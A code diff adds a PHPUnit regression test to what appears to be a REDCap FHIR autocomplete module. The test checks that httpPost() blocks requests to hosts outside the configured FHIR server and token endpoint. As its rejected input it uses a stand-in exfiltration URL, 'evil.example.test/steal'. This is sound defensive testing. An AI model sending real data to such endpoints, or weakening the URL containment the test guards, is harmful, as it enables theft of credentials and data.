@@ -819,6 +819,24 @@ final class FhirOntologyAutocompleteExternalModuleTest extends TestCase
         $this->assertCount(0, FakeHttpTransport::$calls, 'a disallowed URL must never reach the transport');
     }
 
+    public function testHttpPostRefusesUrlOutsideConfiguredFhirServerWhenNoBaseOverrideGiven(): void
+    {
+        // Without an explicit $baseOverride, httpPost() has a second way through -
+        // an exact match against the configured cc_token_endpoint (so
+        // getClientCredentialsToken() can call it without one) - so this must be
+        // checked separately from testHttpGetRefusesUrlOutsideConfiguredFhirServer:
+        // a regression here could reopen the containment gap for every caller that
+        // omits $baseOverride, not just the token endpoint's own call site.
+        $this->module->systemSettings['fhir_api_url'] = 'https://ts.example.test/fhir';
+        $this->module->systemSettings['cc_token_endpoint'] = 'https://auth.example.test/token';
+        FakeHttpTransport::$response = 'should never be reached';
+
+        $result = $this->module->httpPost('https://evil.example.test/steal', [], 'application/x-www-form-urlencoded', ['User-Agent: Redcap']);
+
+        $this->assertFalse($result);
+        $this->assertCount(0, FakeHttpTransport::$calls, 'a disallowed URL must never reach the transport');
+    }
+
     // --- getOnlineDesignerSection() ---
     // Regression coverage for the module.ajax() migration: the Online Designer's
     // ajax calls used to hand-roll $.ajax() + a manually embedded CSRF token
